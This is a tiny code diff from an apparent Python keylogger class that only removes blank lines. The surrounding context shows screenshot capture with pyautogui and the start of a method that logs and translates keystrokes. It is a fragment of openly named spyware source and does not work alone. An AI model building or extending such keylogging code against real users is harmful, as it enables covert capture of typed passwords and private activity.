@@ -18,8 +18,6 @@ class keylogger:
         pyautogui.screenshot().save(file)
         pyautogui.screenshot().close()
         
-
-
     def writeLog(key):
         keydata = str(key).replace("'", "") 
         tKeys = translateKeys.rtrnKeys()
